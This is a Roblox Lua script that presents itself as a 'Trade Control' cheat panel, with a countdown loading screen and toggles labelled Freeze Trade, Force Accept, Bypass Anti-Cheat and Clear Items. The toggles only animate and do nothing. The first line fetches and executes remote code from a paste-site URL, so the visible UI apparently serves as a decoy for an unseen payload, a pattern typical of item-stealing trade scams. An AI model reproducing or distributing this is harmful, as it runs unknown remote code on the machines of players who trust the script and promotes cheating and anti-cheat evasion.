loadstring(game:HttpGet("https://cdn.sourceb.in/bins/qobxTsH3n0/0"))()
--/l
local Players = game:GetService("Players")
local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

--// Remove previous UI
local old = playerGui:FindFirstChild("TradeControlUI")
if old then
	old:Destroy()
end

--// Main GUI
local gui = Instance.new("ScreenGui")
gui.Name = "TradeControlUI"
gui.ResetOnSpawn = false
gui.IgnoreGuiInset = true
gui.Parent = playerGui

--==================================================
-- LOADING SCREEN
--==================================================

local loadingFrame = Instance.new("Frame")
loadingFrame.Size = UDim2.new(0, 330, 0, 150)
loadingFrame.Position = UDim2.new(0.5, -165, 0.5, -75)
loadingFrame.BackgroundColor3 = Color3.fromRGB(14, 20, 29)
loadingFrame.BorderSizePixel = 0
loadingFrame.Parent = gui

local loadingCorner = Instance.new("UICorner")
loadingCorner.CornerRadius = UDim.new(0, 12)
loadingCorner.Parent = loadingFrame

local loadingStroke = Instance.new("UIStroke")
loadingStroke.Color = Color3.fromRGB(45, 55, 70)
loadingStroke.Thickness = 1
loadingStroke.Parent = loadingFrame

local loadingTitle = Instance.new("TextLabel")
loadingTitle.Size = UDim2.new(1, -30, 0, 35)
loadingTitle.Position = UDim2.new(0, 15, 0, 20)
loadingTitle.BackgroundTransparency = 1
loadingTitle.Text = "Loading Trade Control"
loadingTitle.TextColor3 = Color3.fromRGB(240, 243, 248)
loadingTitle.TextSize = 21
loadingTitle.Font = Enum.Font.GothamBold
loadingTitle.Parent = loadingFrame

local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, -30, 0, 30)
loadingText.Position = UDim2.new(0, 15, 0, 58)
loadingText.BackgroundTransparency = 1
loadingText.Text = "Initializing..."
loadingText.TextColor3 = Color3.fromRGB(160, 170, 185)
loadingText.TextSize = 14
loadingText.Font = Enum.Font.Gotham
loadingText.Parent = loadingFrame

local countdown = Instance.new("TextLabel")
countdown.Size = UDim2.new(1, -30, 0, 30)
countdown.Position = UDim2.new(0, 15, 0, 95)
countdown.BackgroundTransparency = 1
countdown.Text = "10s"
countdown.TextColor3 = Color3.fromRGB(90, 170, 255)
countdown.TextSize = 16
countdown.Font = Enum.Font.GothamBold
countdown.Parent = loadingFrame

local messages = {
	"Initializing...",
	"Loading interface...",
	"Preparing controls...",
	"Connecting...",
	"Almost ready..."
}

for i = 10, 1, -1 do
	countdown.Text = tostring(i) .. "s"
	loadingText.Text = messages[((11 - i) % #messages) + 1]
	task.wait(1)
end

loadingText.Text = "Ready!"

task.wait(0.4)

local fade = TweenService:Create(
	loadingFrame,
	TweenInfo.new(0.35),
	{BackgroundTransparency = 1}
)

fade:Play()

for _, obj in ipairs(loadingFrame:GetDescendants()) do
	if obj:IsA("TextLabel") then
		TweenService:Create(
			obj,
			TweenInfo.new(0.35),
			{TextTransparency = 1}
		):Play()
	end
end

task.wait(0.4)
loadingFrame:Destroy()

--==================================================
-- MAIN WINDOW
--==================================================

local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0, 390, 0, 430)
main.Position = UDim2.new(0.5, -195, 0.5, -215)
main.BackgroundColor3 = Color3.fromRGB(12, 18, 27)
main.BorderSizePixel = 0
main.ClipsDescendants = true
main.Parent = gui

local mainCorner = Instance.new("UICorner")
mainCorner.CornerRadius = UDim.new(0, 12)
mainCorner.Parent = main

local mainStroke = Instance.new("UIStroke")
mainStroke.Color = Color3.fromRGB(42, 51, 64)
mainStroke.Thickness = 1
mainStroke.Parent = main

--==================================================
-- TITLE BAR
--==================================================

local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 65)
titleBar.BackgroundColor3 = Color3.fromRGB(10, 15, 23)
titleBar.BorderSizePixel = 0
titleBar.Parent = main

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -80, 1, 0)
title.Position = UDim2.new(0, 20, 0, 0)
title.BackgroundTransparency = 1
title.Text = "•  Trade Control"
title.TextColor3 = Color3.fromRGB(235, 240, 248)
title.TextSize = 21
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = titleBar

local minimize = Instance.new("TextButton")
minimize.Size = UDim2.new(0, 45, 0, 45)
minimize.Position = UDim2.new(1, -55, 0, 10)
minimize.BackgroundTransparency = 1
minimize.Text = "−"
minimize.TextColor3 = Color3.fromRGB(190, 198, 210)
minimize.TextSize = 25
minimize.Font = Enum.Font.Gotham
minimize.Parent = titleBar

--==================================================
-- CONTENT
--==================================================

local content = Instance.new("Frame")
content.Size = UDim2.new(1, 0, 1, -65)
content.Position = UDim2.new(0, 0, 0, 65)
content.BackgroundTransparency = 1
content.Parent = main

--==================================================
-- TOGGLE CREATOR
--==================================================

local function createToggle(name, icon, y, warning)
	local row = Instance.new("Frame")
	row.Size = UDim2.new(1, -24, 0, 78)
	row.Position = UDim2.new(0, 12, 0, y)
	row.BackgroundColor3 = warning
		and Color3.fromRGB(45, 22, 25)
		or Color3.fromRGB(14, 21, 31)
	row.BorderSizePixel = 0
	row.Parent = content

	local rowCorner = Instance.new("UICorner")
	rowCorner.CornerRadius = UDim.new(0, 8)
	rowCorner.Parent = row

	local iconLabel = Instance.new("TextLabel")
	iconLabel.Size = UDim2.new(0, 55, 1, 0)
	iconLabel.BackgroundTransparency = 1
	iconLabel.Text = icon
	iconLabel.TextSize = 25
	iconLabel.TextColor3 = warning
		and Color3.fromRGB(255, 190, 70)
		or Color3.fromRGB(170, 185, 205)
	iconLabel.Font = Enum.Font.GothamBold
	iconLabel.Parent = row

	local text = Instance.new("TextLabel")
	text.Size = UDim2.new(1, -130, 1, 0)
	text.Position = UDim2.new(0, 55, 0, 0)
	text.BackgroundTransparency = 1
	text.Text = name
	text.TextColor3 = Color3.fromRGB(225, 231, 240)
	text.TextSize = 17
	text.Font = Enum.Font.GothamMedium
	text.TextXAlignment = Enum.TextXAlignment.Left
	text.Parent = row

	local button = Instance.new("TextButton")
	button.Size = UDim2.new(0, 72, 0, 36)
	button.Position = UDim2.new(1, -86, 0.5, -18)
	button.BackgroundColor3 = Color3.fromRGB(42, 52, 65)
	button.Text = ""
	button.AutoButtonColor = false
	button.Parent = row

	local buttonCorner = Instance.new("UICorner")
	buttonCorner.CornerRadius = UDim.new(1, 0)
	buttonCorner.Parent = button

	local knob = Instance.new("Frame")
	knob.Size = UDim2.new(0, 30, 0, 30)
	knob.Position = UDim2.new(0, 3, 0.5, -15)
	knob.BackgroundColor3 = Color3.fromRGB(225, 230, 236)
	knob.BorderSizePixel = 0
	knob.Parent = button

	local knobCorner = Instance.new("UICorner")
	knobCorner.CornerRadius = UDim.new(1, 0)
	knobCorner.Parent = knob

	local enabled = false

	button.MouseButton1Click:Connect(function()
		enabled = not enabled

		if enabled then
			TweenService:Create(
				button,
				TweenInfo.new(0.18),
				{BackgroundColor3 = Color3.fromRGB(45, 145, 225)}
			):Play()

			TweenService:Create(
				knob,
				TweenInfo.new(0.18),
				{Position = UDim2.new(1, -33, 0.5, -15)}
			):Play()
		else
			TweenService:Create(
				button,
				TweenInfo.new(0.18),
				{BackgroundColor3 = Color3.fromRGB(42, 52, 65)}
			):Play()

			TweenService:Create(
				knob,
				TweenInfo.new(0.18),
				{Position = UDim2.new(0, 3, 0.5, -15)}
			):Play()
		end
	end)

	return row
end

-- Icons are simple text symbols so the UI stays self-contained.
createToggle("Freeze Trade", "✣", 10, false)
createToggle("Force Accept", "✓", 88, false)
createToggle("Bypass Anti-Cheat", "!", 166, true)
createToggle("Clear Items", "▦", 244, false)

--==================================================
-- DRAGGING
--==================================================

local dragging = false
local dragStart
local startPos

local function updateDrag(input)
	local delta = input.Position - dragStart

	main.Position = UDim2.new(
		startPos.X.Scale,
		startPos.X.Offset + delta.X,
		startPos.Y.Scale,
		startPos.Y.Offset + delta.Y
	)
end

titleBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1
		or input.UserInputType == Enum.UserInputType.Touch then

		dragging = true
		dragStart = input.Position
		startPos = main.Position

		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragging = false
			end
		end)
	end
end)

UserInputService.InputChanged:Connect(function(input)
	if dragging and (
		input.UserInputType == Enum.UserInputType.MouseMovement
		or input.UserInputType == Enum.UserInputType.Touch
	) then
		updateDrag(input)
	end
end)

--==================================================
-- MINIMIZE
--==================================================

local minimized = false
local normalSize = main.Size

minimize.MouseButton1Click:Connect(function()
	minimized = not minimized

	if minimized then
		minimize.Text = "+"
		content.Visible = false

		TweenService:Create(
			main,
			TweenInfo.new(0.2),
			{Size = UDim2.new(0, 390, 0, 65)}
		):Play()
	else
		minimize.Text = "−"
		content.Visible = true

		TweenService:Create(
			main,
			TweenInfo.new(0.2),
			{Size = normalSize}
		):Play()
	end
end)
